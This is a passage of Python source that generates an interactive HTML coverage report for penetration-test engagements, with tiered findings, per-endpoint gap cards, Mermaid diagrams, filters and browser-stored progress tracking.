    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    total = len(audits)
    total_gaps = sum(len(a.gaps) for a in audits)
    avg = sum(a.coverage_score for a in audits) // max(total, 1)
    _sevorder = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}

    # ── Tiered findings. 'evidence' = exploit-evidence (Confirmed Findings),
    # 'observation' = header/cookie misconfig (Configuration Observations). The
    # headline tiles (Confirmed Findings / Critical / High) count ONLY the
    # evidence tier, so config noise can never inflate the banner. ──
    evidence_pairs = [(a, gp) for a in audits for gp in a.gaps if getattr(gp, 'tier', '') == 'evidence']
    observation_pairs = [(a, gp) for a in audits for gp in a.gaps if getattr(gp, 'tier', '') == 'observation']
    evidence_pairs.sort(key=lambda t: _sevorder.get(t[1].severity, 9))
    observation_pairs.sort(key=lambda t: _sevorder.get(t[1].severity, 9))
    findings_count = len(evidence_pairs)
    critical = sum(1 for _a, gp in evidence_pairs if gp.severity == 'CRITICAL')
    high = sum(1 for _a, gp in evidence_pairs if gp.severity == 'HIGH')

    # ── Confirmed Findings (evidence tier), pinned at the top ──
    if evidence_pairs:
        findings_html = (
            '  <section id="findings-sec" class="findings">'
            '<h2 class="sec-title">Confirmed Findings (' + str(findings_count) + ')</h2>'
            '<div class="finding-note muted">Exploit-evidence results pinned at the top &mdash; '
            'these are confirmed signals (cross-identity access, SQL error/stack-trace/JWT/secret/PII '
            'in responses, response-confirmed reflection), not to-dos.</div>'
            + "".join(_html_gap_row(a, gp) for a, gp in evidence_pairs) + '</section>\n')
    else:
        findings_html = (
            '  <section id="findings-sec" class="findings">'
            '<h2 class="sec-title">Confirmed Findings (0)</h2>'
            '<div class="finding-note muted">No exploit-evidence findings &mdash; see Configuration '
            'Observations and the coverage/test gaps below.</div></section>\n')

    # ── Configuration Observations (observation tier), separate pinned section ──
    if observation_pairs:
        observations_html = (
            '  <section id="observations-sec" class="observations">'
            '<h2 class="sec-title">Configuration Observations (' + str(len(observation_pairs)) + ')</h2>'
            '<div class="finding-note muted">Header / cookie misconfigurations. These are host-level '
            'hardening gaps (deduplicated to one row per host + signature), not exploit evidence &mdash; '
            'they are NOT counted in the headline finding/critical tiles.</div>'
            + "".join(_html_gap_row(a, gp) for a, gp in observation_pairs) + '</section>\n')
    else:
        observations_html = ''

    # ── OWASP filter options ──
    owasp_set = sorted(set(gp.owasp for a in audits for gp in a.gaps if gp.owasp))
    owasp_opts = '<option value="__all__">All OWASP</option>' + "".join(
        '<option value="{0}">{0}</option>'.format(_html_escape(o)) for o in owasp_set)

    # ── Endpoint cards (coverage/test gaps only; findings live in the top section) ──
    cards = []
    i = 0
    for a in audits:
        i += 1
        ep = "{0}{1}".format(a.host, a.path)
        cats = defaultdict(list)
        for gp in a.gaps:
            cats[gp.category].append(gp)
        mind = [
            "mindmap",
            "  root(({0}))".format(_mermaid_safe(a.path) or 'endpoint'),
            "    Coverage",
            "      {0}-100 {1}".format(a.coverage_score, score_label(a.coverage_score)),
            "    Behavior",
            "      {0}".format(a.behavior_class),
        ]
        if a.gaps:
            mind.append("    Gaps")
            for c, gs in cats.items():
                mind.append("      {0}".format(_mermaid_safe(c)))
                for gp in gs:
                    mind.append("        {0} {1}".format(_mermaid_safe(gp.severity), _mermaid_safe(gp.title)))
        mermaid_src = "\n".join(mind)

        gap_rows = []
        for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            for gp in [x for x in a.gaps if x.severity == sev and x.kind != 'finding']:
                gap_rows.append(_html_gap_row(a, gp))
        card_rows = ("".join(gap_rows) if gap_rows
                     else '<p class="muted">No coverage gaps flagged (see Confirmed Findings above).</p>')

        sc = a.coverage_score
        score_cls = 's-bad' if sc < 40 else ('s-mid' if sc < 70 else 's-ok')
        credited = getattr(a, 'tests_credited', 0)
        test_gaps_n = sum(1 for gp in a.gaps if gp.kind == 'test')
        tools = getattr(a, 'tools_seen', []) or []
        tools_txt = ", ".join(tools) if tools else "unknown"
        if getattr(a, 'scanner_audited', False):
            tools_txt += " (Scanner-audited: injection classes credited)"
        cards.append(
            '  <div class="ep" id="ep-{epid}">'
            '<div class="ep-head">'
            '<h2>EP{n} &mdash; {ep}</h2>'
            '<div class="meta">'
            '<span class="score {scls}">{sc}/100 &middot; {slabel}</span>'
            '<span>Behavior: <b>{beh}</b></span>'
            '<span>Requests: <b>{req}</b></span>'
            '<span>Methods: <b>{meth}</b></span>'
            '<span>Auth: <b>{aw}</b> auth / <b>{au}</b> unauth</span>'
            '<span>Tests proven: <b>{cred}</b> / {trem} remaining</span>'
            '<span>Tested by: <b>{tools}</b></span>'
            '<span class="ep-counter muted"></span>'
            '<button type="button" class="diagram-btn">diagram</button>'
            '</div></div>'
            '<div class="ep-body">'
            '<div class="diagram-wrap hidden"><pre class="mermaid">\n{mermaid}\n</pre></div>'
            '<div class="missed"><h3>Gaps / Missed Test Cases</h3>{rows}</div>'
            '</div></div>\n'.format(
                epid=_html_escape(a.endpoint_id), n=i, ep=_html_escape(ep), scls=score_cls,
                sc=sc, slabel=score_label(sc), beh=_html_escape(a.behavior_class.upper()),
                req=a.total_requests, meth=_html_escape(", ".join(a.methods_seen)),
                aw=a.auth_coverage['with_auth'], au=a.auth_coverage['without_auth'],
                cred=credited, trem=test_gaps_n, tools=_html_escape(tools_txt),
                mermaid=mermaid_src, rows=card_rows))

    # ── CSS (concatenated; never passed through .format because it has braces) ──
    css = (
        ":root { --bg:#0f1419; --card:#1b232d; --line:#2c3a47; --txt:#e6edf3; --muted:#9bb0c0;"
        "        --accent:#4ea1ff; --crit:#ff5d5d; --high:#ffa64d; --med:#ffe066; --low:#7dd3fc; }"
        "* { box-sizing:border-box; }"
        "body { margin:0; background:var(--bg); color:var(--txt);"
        "       font-family:'Segoe UI',Roboto,Arial,sans-serif; line-height:1.5; padding:32px; }"
        "h1 { font-size:1.6rem; margin:0 0 4px; }"
        ".sub { color:var(--muted); font-size:.9rem; margin-bottom:20px; }"
        ".summary { display:flex; flex-wrap:wrap; gap:14px; margin-bottom:18px; }"
        ".stat { background:var(--card); border:1px solid var(--line); border-radius:10px;"
        "        padding:12px 18px; min-width:120px; }"
        ".stat .n { font-size:1.5rem; font-weight:700; }"
        ".stat .l { color:var(--muted); font-size:.78rem; text-transform:uppercase; letter-spacing:.05em; }"
        ".toolbar { position:sticky; top:0; z-index:50; background:#0c1116cc; backdrop-filter:blur(4px);"
        "           border:1px solid var(--line); border-radius:10px; padding:10px 14px; margin-bottom:16px; }"
        ".tb-row { display:flex; flex-wrap:wrap; align-items:center; gap:8px 16px; font-size:.85rem; }"
        ".toolbar label { color:var(--muted); }"
        ".toolbar select, .toolbar input[type=text] { background:#1b232d; color:var(--txt);"
        "           border:1px solid var(--line); border-radius:6px; padding:4px 8px; font-size:.85rem; }"
        ".toolbar input[type=text] { min-width:220px; }"
        ".tb-spacer { flex:1 1 auto; }"
        ".btn { background:#243447; color:#cfe6ff; border:1px solid #355068; border-radius:6px;"
        "       padding:6px 12px; font-size:.82rem; cursor:pointer; }"
        ".btn:hover { background:#2c3e50; }"
        ".btn-danger { background:#3a1f24; color:#ffb3b3; border-color:#6a2f37; }"
        ".prog-wrap { display:flex; align-items:center; gap:12px; margin-bottom:22px; }"
        ".prog-bar { flex:1 1 auto; height:12px; background:#0c1116; border:1px solid var(--line);"
        "            border-radius:8px; overflow:hidden; }"
        ".prog-fill { height:100%; width:0; background:linear-gradient(90deg,#4ea1ff,#76d59a); transition:width .2s; }"
        ".prog-text { color:var(--muted); font-size:.85rem; white-space:nowrap; }"
        ".sec-title { font-size:1.15rem; margin:0 0 6px; }"
        ".findings { background:var(--card); border:1px solid var(--line); border-left:4px solid var(--crit);"
        "            border-radius:12px; padding:16px 20px; margin-bottom:24px; }"
        ".observations { background:var(--card); border:1px solid var(--line); border-left:4px solid var(--med);"
        "            border-radius:12px; padding:16px 20px; margin-bottom:24px; }"
        ".finding-note { font-size:.8rem; margin-bottom:10px; }"
        ".grouped { margin-bottom:8px; }"
        ".grouped-title { font-size:.8rem; text-transform:uppercase; letter-spacing:.06em;"
        "                 color:var(--muted); margin:0 0 8px; }"
        ".gap-group { border:1px solid var(--line); border-radius:8px; margin-bottom:8px; background:#141b24; }"
        ".gap-group-head { display:flex; align-items:center; gap:8px; flex-wrap:wrap;"
        "                  padding:8px 10px; cursor:pointer; }"
        ".gap-group-head:hover { background:#18202b; }"
        ".gg-title { font-weight:600; flex:1 1 260px; }"
        ".gg-count { background:#243447; color:#9bd0ff; border:1px solid #355068; border-radius:10px;"
        "            padding:1px 9px; font-size:.74rem; flex:0 0 auto; }"
        ".gg-caret { color:var(--muted); font-size:.74rem; flex:0 0 auto; }"
        ".gap-group.collapsed .gg-caret::after { content:'\\25b6  expand'; }"
        ".gap-group:not(.collapsed) .gg-caret::after { content:'\\25bc  collapse'; }"
        ".gap-group-body { padding:0 10px 8px; }"
        ".gap-group.collapsed .gap-group-body { display:none; }"
        ".gg-eplist { font-size:.78rem; margin:2px 0 8px; }"
        ".ep { background:var(--card); border:1px solid var(--line); border-radius:12px;"
        "      padding:14px 20px; margin-bottom:18px; }"
        ".ep-head { cursor:pointer; }"
        ".ep h2 { font-size:1.05rem; margin:0 0 8px; color:var(--accent);"
        "         font-family:Consolas,monospace; word-break:break-all; }"
        ".ep.collapsed .ep-body { display:none; }"
        ".meta { display:flex; flex-wrap:wrap; gap:14px; font-size:.82rem; color:var(--muted); margin-bottom:8px;"
        "        align-items:center; }"
        ".meta b { color:var(--txt); }"
        ".ep-counter { font-size:.8rem; }"
        ".score { padding:2px 10px; border-radius:6px; font-weight:700; color:#0f1419; }"
        ".s-bad { background:var(--crit); } .s-mid { background:var(--med); } .s-ok { background:#76d59a; }"
        ".diagram-btn { background:#243447; color:#9bd0ff; border:1px solid #355068; border-radius:6px;"
        "               padding:2px 8px; font-size:.74rem; cursor:pointer; }"
        ".diagram-wrap { margin:8px 0 12px; } .diagram-wrap.hidden { display:none; }"
        ".mermaid { background:#fbfdff; border-radius:8px; padding:12px; overflow-x:auto; }"
        ".missed { margin-top:8px; }"
        ".missed h3 { font-size:.8rem; text-transform:uppercase; letter-spacing:.06em; color:var(--muted); margin:0 0 8px; }"
        ".muted { color:var(--muted); }"
        ".gap-row { border:1px solid var(--line); border-radius:8px; padding:8px 10px; margin-bottom:8px; background:#161d26; }"
        ".gap-row.k-finding { border-left:4px solid var(--crit); background:#221519; }"
        ".gap-row.done { opacity:.5; }"
        ".gap-row.done .g-title { text-decoration:line-through; }"
        ".gap-row.k-finding.done { opacity:1; }"
        ".gap-row.k-finding.done .g-title { text-decoration:none; }"
        ".gap-head { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }"
        ".g-title { font-weight:600; flex:1 1 260px; }"
        ".g-check { width:16px; height:16px; flex:0 0 auto; }"
        ".g-status { background:#1b232d; color:var(--txt); border:1px solid var(--line);"
        "            border-radius:6px; padding:2px 6px; font-size:.78rem; }"
        ".g-note-toggle { background:transparent; color:var(--muted); border:1px solid var(--line);"
        "                 border-radius:6px; padding:2px 8px; font-size:.72rem; cursor:pointer; }"
        ".gap-body { margin-top:6px; font-size:.85rem; color:var(--muted); }"
        ".gap-body .ev, .gap-body .rec { margin-top:4px; }"
        ".g-note { display:block; width:100%; margin-top:8px; min-height:54px; background:#0c1116;"
        "          color:var(--txt); border:1px solid var(--line); border-radius:6px; padding:6px;"
        "          font-family:inherit; font-size:.82rem; resize:vertical; }"
        "code { background:#0c1116; padding:1px 5px; border-radius:4px;"
        "       font-family:Consolas,monospace; font-size:.85em; color:#ffd9a0; word-break:break-all; }"
        ".tag { display:inline-block; font-size:.7rem; font-weight:700; padding:1px 7px;"
        "       border-radius:4px; color:#0f1419; flex:0 0 auto; }"
        ".t-crit { background:var(--crit); } .t-high { background:var(--high); }"
        ".t-med { background:var(--med); } .t-low { background:var(--low); }"
        ".owasp { display:inline-block; font-size:.68rem; font-weight:600; padding:1px 7px;"
        "         border-radius:4px; background:#243447; color:#9bd0ff; border:1px solid #355068; flex:0 0 auto; }"
        ".hidden { display:none; }"
        "footer { color:var(--muted); font-size:.8rem; margin-top:8px; }"
        "@media print {"
        "  body { background:#fff; color:#000; padding:0; }"
        "  .toolbar, .prog-wrap, .diagram-btn, .g-note-toggle, #btn-export, #btn-reset { display:none !important; }"
        "  .ep.collapsed .ep-body { display:block !important; }"
        "  .diagram-wrap.hidden { display:none !important; }"
        "  .ep, .findings, .stat, .gap-row { border-color:#bbb; background:#fff; color:#000; break-inside:avoid; }"
        "  .gap-row.done { opacity:1; }"
        "  .muted, .prog-text, .ep-counter, .ep h2, .sec-title { color:#222; }"
        "  code { background:#eee; color:#000; }"
        "  .g-note { background:#fff; color:#000; }"
        "  .g-check, .g-status { -webkit-appearance:auto; appearance:auto; }"
        "}"
    )

    head = (
        '<!DOCTYPE html>\n<html lang="en"><head>\n'
        '<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">\n'
        '<title>Pentest Coverage Audit &mdash; ' + _html_escape(engagement) + '</title>\n'
        '<style>' + css + '</style></head><body>\n'
        '  <h1>Pentest Coverage Audit &mdash; ' + _html_escape(engagement) + '</h1>\n'
        '  <div class="sub">Generated ' + _html_escape(now) + ' &middot; interactive engagement checklist '
        '&middot; progress (status / notes) is saved in this browser via localStorage. '
        'Feed <code>_audit.json</code> to the pentest-coverage-analyser skill for contextual analysis.</div>\n'
    )

    summary = (
        '  <div class="summary">'
        '<div class="stat"><div class="n">{0}</div><div class="l">Endpoints</div></div>'
        '<div class="stat"><div class="n">{1}/100</div><div class="l">Avg &middot; {2}</div></div>'
        '<div class="stat"><div class="n">{3}</div><div class="l">Total Gaps</div></div>'
        '<div class="stat"><div class="n" style="color:var(--crit)">{4}</div><div class="l">Critical</div></div>'
        '<div class="stat"><div class="n" style="color:var(--high)">{5}</div><div class="l">High</div></div>'
        '<div class="stat"><div class="n" style="color:var(--crit)">{6}</div><div class="l">Confirmed Findings</div></div>'
        '<div class="stat"><div class="n" id="tile-tested">0 / 0</div><div class="l">Tested / Counted</div></div>'
        '</div>\n'
    ).format(total, avg, score_label(avg), total_gaps, critical, high, findings_count)

    toolbar = (
        '  <div class="toolbar" id="toolbar"><div class="tb-row">'
        '<strong>Severity:</strong>'
        '<label><input type="checkbox" class="sev-toggle" value="CRITICAL" checked> Crit</label>'
        '<label><input type="checkbox" class="sev-toggle" value="HIGH" checked> High</label>'
        '<label><input type="checkbox" class="sev-toggle" value="MEDIUM" checked> Med</label>'
        '<label><input type="checkbox" class="sev-toggle" value="LOW" checked> Low</label>'
        '<label>Status: <select id="f-status">'
        '<option value="all">All</option><option value="open">Open only</option>'
        '<option value="hidetested">Hide tested</option><option value="confirmed">Confirmed only</option>'
        '<option value="fp">False positives</option></select></label>'
        '<label>OWASP: <select id="f-owasp">' + owasp_opts + '</select></label>'
        '<input type="text" id="f-text" placeholder="Filter title / evidence / fix...">'
        '<label title="Collapse coverage/test gaps that share the same title into one expandable row">'
        '<input type="checkbox" id="f-group" checked> Group identical gaps</label>'
        '<span class="tb-spacer"></span>'
        '<button class="btn" id="btn-export" type="button">Export progress (JSON)</button>'
        '<button class="btn" id="btn-import" type="button">Import progress (JSON)</button>'
        '<input type="file" id="import-file" accept="application/json,.json" class="hidden">'
        '<button class="btn btn-danger" id="btn-reset" type="button">Reset progress</button>'
        '</div></div>\n'
    )

    progress = (
        '  <div class="prog-wrap"><div class="prog-bar"><div class="prog-fill" id="prog-fill"></div></div>'
        '<span class="prog-text" id="prog-text">0 / 0 tested</span></div>\n'
    )

    # ── Client-side logic (concatenated raw; ENG injected as a JS string literal) ──
    js_body = (
        'var PREFIX = "covermap:" + ENG + ":";\n'
        'function lsGet(k){ try { return window.localStorage.getItem(k); } catch(e){ return null; } }\n'
        'function lsSet(k,v){ try { window.localStorage.setItem(k,v); } catch(e){} }\n'
        'function lsDel(k){ try { window.localStorage.removeItem(k); } catch(e){} }\n'
        'function noteKey(row){ return PREFIX + row.getAttribute("data-gid") + ":note"; }\n'
        'function isExcluded(s){ return s==="False Positive" || s==="N/A"; }\n'
        'function isDone(chk,s){ return !isExcluded(s) && (chk || s==="Tested" || s==="Confirmed Finding"); }\n'
        'function loadRow(row){\n'
        '  var sel=row.querySelector(".g-status"), chk=row.querySelector(".g-check");\n'
        '  var status=row.getAttribute("data-default-status")||"Open", checked=false;\n'
        '  var raw=lsGet(PREFIX+row.getAttribute("data-gid"));\n'
        '  if(raw){ try { var o=JSON.parse(raw); if(o){ if(o.status) status=o.status; checked=!!o.checked; } } catch(e){} }\n'
        '  sel.value=status; chk.checked=checked;\n'
        '  var nt=row.querySelector(".g-note"), nv=lsGet(noteKey(row)); if(nv!=null) nt.value=nv;\n'
        '  paintRow(row);\n'
        '}\n'
        'function saveRow(row){\n'
        '  lsSet(PREFIX+row.getAttribute("data-gid"), JSON.stringify({\n'
        '    status: row.querySelector(".g-status").value,\n'
        '    checked: row.querySelector(".g-check").checked }));\n'
        '}\n'
        'function paintRow(row){\n'
        '  var chk=row.querySelector(".g-check").checked, status=row.querySelector(".g-status").value;\n'
        '  row.classList.toggle("done", isDone(chk,status));\n'
        '}\n'
        'function syncFromCheck(row){\n'
        '  var chk=row.querySelector(".g-check").checked, sel=row.querySelector(".g-status");\n'
        '  if(chk && (sel.value==="Open"||sel.value==="In Progress")) sel.value="Tested";\n'
        '  if(!chk && sel.value==="Tested") sel.value="Open";\n'
        '}\n'
        'function syncFromStatus(row){\n'
        '  var sel=row.querySelector(".g-status").value, chk=row.querySelector(".g-check");\n'
        '  if(sel==="Tested"||sel==="Confirmed Finding"||sel==="False Positive"||sel==="N/A") chk.checked=true;\n'
        '  if(sel==="Open"||sel==="In Progress") chk.checked=false;\n'
        '}\n'
        'function countRows(rows){\n'
        '  var counted=0, done=0;\n'
        '  rows.forEach(function(row){\n'
        '    var chk=row.querySelector(".g-check").checked, status=row.querySelector(".g-status").value;\n'
        '    if(!isExcluded(status)){ counted++; if(isDone(chk,status)) done++; }\n'
        '  });\n'
        '  return [done,counted];\n'
        '}\n'
        'function updateProgress(){\n'
        '  var all=Array.prototype.slice.call(document.querySelectorAll(".gap-row"));\n'
        '  var r=countRows(all), done=r[0], counted=r[1];\n'
        '  var pct=counted? Math.round(done*100/counted):0;\n'
        '  document.getElementById("prog-fill").style.width=pct+"%";\n'
        '  document.getElementById("prog-text").textContent=done+" / "+counted+" tested ("+pct+"%)";\n'
        '  document.getElementById("tile-tested").textContent=done+" / "+counted;\n'
        '  document.querySelectorAll(".ep").forEach(function(card){\n'
        '    var cr=Array.prototype.slice.call(card.querySelectorAll(".gap-row"));\n'
        '    var x=countRows(cr); var el=card.querySelector(".ep-counter");\n'
        '    if(el) el.textContent=x[0]+"/"+x[1]+" tested";\n'
        '  });\n'
        '}\n'
        'function applyFilters(){\n'
        '  var sevOn={}; document.querySelectorAll(".sev-toggle").forEach(function(cb){ sevOn[cb.value]=cb.checked; });\n'
        '  var sf=document.getElementById("f-status").value;\n'
        '  var of=document.getElementById("f-owasp").value;\n'
        '  var q=document.getElementById("f-text").value.toLowerCase().trim();\n'
        '  document.querySelectorAll(".gap-row").forEach(function(row){\n'
        '    var sev=row.getAttribute("data-sev");\n'
        '    var status=row.querySelector(".g-status").value, chk=row.querySelector(".g-check").checked;\n'
        '    var owasp=row.getAttribute("data-owasp")||"", text=row.getAttribute("data-search")||"";\n'
        '    var vis=true;\n'
        '    if(sev && sevOn[sev]===false) vis=false;\n'
        '    if(of!=="__all__" && owasp!==of) vis=false;\n'
        '    if(q && text.indexOf(q)<0) vis=false;\n'
        '    if(sf==="open" && !(status==="Open"||status==="In Progress")) vis=false;\n'
        '    if(sf==="hidetested" && isDone(chk,status)) vis=false;\n'
        '    if(sf==="confirmed" && status!=="Confirmed Finding") vis=false;\n'
        '    if(sf==="fp" && status!=="False Positive") vis=false;\n'
        '    row.style.display=vis?"":"none";\n'
        '  });\n'
        '  document.querySelectorAll(".ep").forEach(function(card){\n'
        '    var any=Array.prototype.some.call(card.querySelectorAll(".gap-row"), function(r){ return r.style.display!=="none"; });\n'
        '    var hasRows=card.querySelectorAll(".gap-row").length>0;\n'
        '    card.style.display=(!hasRows||any)?"":"none";\n'
        '  });\n'
        '  ["findings-sec","observations-sec"].forEach(function(id){\n'
        '    var sec=document.getElementById(id); if(!sec) return;\n'
        '    var anyf=Array.prototype.some.call(sec.querySelectorAll(".gap-row"), function(r){ return r.style.display!=="none"; });\n'
        '    sec.style.display=anyf?"":"none";\n'
        '  });\n'
        '  document.querySelectorAll("#grouped-gaps .gap-group").forEach(function(grp){\n'
        '    var any=Array.prototype.some.call(grp.querySelectorAll(".gap-row"), function(r){ return r.style.display!=="none"; });\n'
        '    grp.style.display=any?"":"none";\n'
        '  });\n'
        '  var gsec=document.getElementById("grouped-gaps");\n'
        '  if(gsec){\n'
        '    var anyg=Array.prototype.some.call(gsec.querySelectorAll(".gap-group"), function(g){ return g.style.display!=="none"; });\n'
        '    gsec.style.display=anyg?"":"none";\n'
        '  }\n'
        '}\n'
        'function escHtml(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }\n'
        'var GG_TAG={CRITICAL:"t-crit",HIGH:"t-high",MEDIUM:"t-med",LOW:"t-low"};\n'
        'var GROUP_KEY="__groupgaps";\n'
        'function getGroupOn(){ var v=lsGet(PREFIX+GROUP_KEY); return v===null? true : v==="1"; }\n'
        'function setGroupOn(on){ lsSet(PREFIX+GROUP_KEY, on?"1":"0"); }\n'
        'var _origPos=null;\n'
        'function recordOrigPositions(){\n'
        '  if(_origPos) return;\n'
        '  _origPos=[];\n'
        '  document.querySelectorAll(".ep .gap-row").forEach(function(row){\n'
        '    _origPos.push({row:row, parent:row.parentNode, next:row.nextSibling});\n'
        '  });\n'
        '}\n'
        'function ungroupGaps(){\n'
        '  if(_origPos){ _origPos.forEach(function(o){\n'
        '    var ref=(o.next && o.next.parentNode===o.parent)? o.next : null;\n'   # stale sibling (also grouped) -> append
        '    o.parent.insertBefore(o.row, ref);\n'
        '  }); }\n'
        '  var g=document.getElementById("grouped-gaps");\n'
        '  if(g){ g.querySelectorAll(".gap-group").forEach(function(n){ n.parentNode.removeChild(n); }); g.style.display="none"; }\n'
        '}\n'
        'function groupGaps(){\n'
        '  var g=document.getElementById("grouped-gaps"); if(!g) return;\n'
        '  var groups={}, orderKeys=[];\n'
        '  document.querySelectorAll(".ep .gap-row").forEach(function(row){\n'
        '    if(row.getAttribute("data-kind")==="finding") return;\n'   # findings live in their own sections
        '    var t=row.getAttribute("data-title")||"";\n'
        '    if(!groups[t]){ groups[t]=[]; orderKeys.push(t); }\n'
        '    groups[t].push(row);\n'
        '  });\n'
        '  orderKeys.forEach(function(t){\n'
        '    var rows=groups[t];\n'
        '    if(rows.length<2) return;\n'   # singletons stay in their endpoint cards
        '    var sev=rows[0].getAttribute("data-sev")||"LOW";\n'
        '    var eps=rows.map(function(r){ return r.getAttribute("data-ep")||"?"; });\n'
        '    var wrap=document.createElement("div"); wrap.className="gap-group collapsed";\n'
        '    var head=document.createElement("div"); head.className="gap-group-head";\n'
        '    head.innerHTML=\'<span class="tag \'+(GG_TAG[sev]||"t-low")+\'">\'+sev+\'</span>\'\n'
        '      +\'<span class="gg-title">\'+escHtml(t)+\'</span>\'\n'
        '      +\'<span class="gg-count">\'+rows.length+\' endpoints</span>\'\n'
        '      +\'<span class="gg-caret"></span>\';\n'
        '    var body=document.createElement("div"); body.className="gap-group-body";\n'
        '    var eplist=document.createElement("div"); eplist.className="gg-eplist muted";\n'
        '    eplist.textContent="Affected endpoints: "+eps.join(", ");\n'
        '    body.appendChild(eplist);\n'
        '    rows.forEach(function(r){ body.appendChild(r); });\n'   # MOVE real rows in -> data-gid + listeners preserved
        '    head.addEventListener("click", function(){ wrap.classList.toggle("collapsed"); });\n'
        '    wrap.appendChild(head); wrap.appendChild(body);\n'
        '    g.appendChild(wrap);\n'
        '  });\n'
        '  g.style.display = g.querySelector(".gap-group")? "" : "none";\n'
        '}\n'
        'function applyGrouping(){\n'
        '  recordOrigPositions();\n'
        '  ungroupGaps();\n'
        '  if(getGroupOn()) groupGaps();\n'
        '  updateProgress(); applyFilters();\n'
        '}\n'
        'function exportProgress(){\n'
        '  var map={};\n'
        '  document.querySelectorAll(".gap-row").forEach(function(row){\n'
        '    map[row.getAttribute("data-gid")]={ status:row.querySelector(".g-status").value,\n'
        '      checked:row.querySelector(".g-check").checked, note:row.querySelector(".g-note").value };\n'
        '  });\n'
        '  var blob=new Blob([JSON.stringify(map,null,2)], {type:"application/json"});\n'
        '  var a=document.createElement("a");\n'
        '  a.href=URL.createObjectURL(blob);\n'
        '  a.download="covermap_progress_"+ENG.replace(/[^A-Za-z0-9_.-]/g,"_")+".json";\n'
        '  document.body.appendChild(a); a.click(); document.body.removeChild(a);\n'
        '}\n'
        'function resetProgress(){\n'
        '  if(!confirm("Clear all saved progress for this report ("+ENG+")? This cannot be undone.")) return;\n'
        '  var keys=[];\n'
        '  for(var i=0;i<window.localStorage.length;i++){ var k=window.localStorage.key(i); if(k && k.indexOf(PREFIX)===0) keys.push(k); }\n'
        '  keys.forEach(lsDel); location.reload();\n'
        '}\n'
        'function importProgress(file){\n'
        '  if(!file) return;\n'
        '  var reader=new FileReader();\n'
        '  reader.onload=function(){\n'
        '    var map; try { map=JSON.parse(reader.result); } catch(e){ alert("Not valid JSON: "+e); return; }\n'
        '    if(!map || typeof map!=="object"){ alert("Unexpected file format (expected a {gid:{status,checked,note}} map)."); return; }\n'
        '    var known={}; document.querySelectorAll(".gap-row").forEach(function(row){ known[row.getAttribute("data-gid")]=1; });\n'
        '    var applied=0, unknown=0;\n'
        '    Object.keys(map).forEach(function(gid){\n'
        '      var v=map[gid]||{};\n'
        '      lsSet(PREFIX+gid, JSON.stringify({ status:(v.status||"Open"), checked:!!v.checked }));\n'
        '      if(typeof v.note==="string" && v.note.length) lsSet(PREFIX+gid+":note", v.note);\n'
        '      if(known[gid]) applied++; else unknown++;\n'
        '    });\n'
        '    alert("Imported progress for "+Object.keys(map).length+" gap(s): "+applied+" match this report, "+unknown+" not present here (kept for re-runs). Reloading.");\n'
        '    location.reload();\n'
        '  };\n'
        '  reader.onerror=function(){ alert("Could not read file."); };\n'
        '  reader.readAsText(file);\n'
        '}\n'
        'function toggleDiagram(card){\n'
        '  var wrap=card.querySelector(".diagram-wrap"); if(!wrap) return;\n'
        '  var hidden=wrap.classList.toggle("hidden");\n'
        '  if(!hidden && wrap.getAttribute("data-rendered")!=="1"){\n'
        '    try { mermaid.run({ nodes:[wrap.querySelector(".mermaid")] }); } catch(e){}\n'
        '    wrap.setAttribute("data-rendered","1");\n'
        '  }\n'
        '}\n'
        'document.addEventListener("DOMContentLoaded", function(){\n'
        '  try { mermaid.initialize({ startOnLoad:false, theme:"dark", securityLevel:"loose" }); } catch(e){}\n'
        '  document.querySelectorAll(".gap-row").forEach(function(row){\n'
        '    loadRow(row);\n'
        '    row.querySelector(".g-check").addEventListener("change", function(){ syncFromCheck(row); saveRow(row); paintRow(row); updateProgress(); applyFilters(); });\n'
        '    row.querySelector(".g-status").addEventListener("change", function(){ syncFromStatus(row); saveRow(row); paintRow(row); updateProgress(); applyFilters(); });\n'
        '    var nt=row.querySelector(".g-note");\n'
        '    nt.addEventListener("input", function(){ lsSet(noteKey(row), nt.value); });\n'
        '    row.querySelector(".g-note-toggle").addEventListener("click", function(){ nt.classList.toggle("hidden"); });\n'
        '  });\n'
        '  document.querySelectorAll(".ep-head").forEach(function(h){\n'
        '    h.addEventListener("click", function(e){ if(e.target.classList.contains("diagram-btn")) return; h.parentNode.classList.toggle("collapsed"); });\n'
        '  });\n'
        '  document.querySelectorAll(".diagram-btn").forEach(function(b){\n'
        '    b.addEventListener("click", function(e){ e.stopPropagation(); toggleDiagram(b.closest(".ep")); });\n'
        '  });\n'
        '  document.querySelectorAll(".sev-toggle").forEach(function(cb){ cb.addEventListener("change", applyFilters); });\n'
        '  document.getElementById("f-status").addEventListener("change", applyFilters);\n'
        '  document.getElementById("f-owasp").addEventListener("change", applyFilters);\n'
        '  document.getElementById("f-text").addEventListener("input", applyFilters);\n'
        '  document.getElementById("btn-export").addEventListener("click", exportProgress);\n'
        '  var impFile=document.getElementById("import-file");\n'
        '  document.getElementById("btn-import").addEventListener("click", function(){ impFile.value=""; impFile.click(); });\n'
        '  impFile.addEventListener("change", function(){ importProgress(impFile.files && impFile.files[0]); });\n'
        '  document.getElementById("btn-reset").addEventListener("click", resetProgress);\n'
        '  var grpCb=document.getElementById("f-group");\n'
        '  if(grpCb){\n'
        '    grpCb.checked=getGroupOn();\n'
        '    grpCb.addEventListener("change", function(){ setGroupOn(grpCb.checked); applyGrouping(); });\n'
        '  }\n'
        '  applyGrouping();\n'   # builds groups if ON, then runs updateProgress()+applyFilters()
        '});\n'
    )
    js = 'var ENG = ' + json.dumps(engagement) + ';\n' + js_body

    tail = (
        '  <footer>Progress is stored only in this browser (localStorage, no server). '
        'Use &ldquo;Export progress&rdquo; for a portable copy; &ldquo;Reset progress&rdquo; clears it. '
        'Mermaid diagrams load from a CDN on first expand.</footer>\n'
        '  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>\n'
        '  <script>\n' + js + '  </script>\n'
        '</body></html>'
    )
    # Grouped coverage/test gaps land here (populated client-side when the
    # "Group identical gaps" toggle is ON; the real per-endpoint rows are MOVED
    # in, so their data-gid / localStorage state is preserved).
    grouped_section = ('  <section id="grouped-gaps" class="grouped" style="display:none">'
                       '<h3 class="grouped-title">Grouped coverage / test gaps '
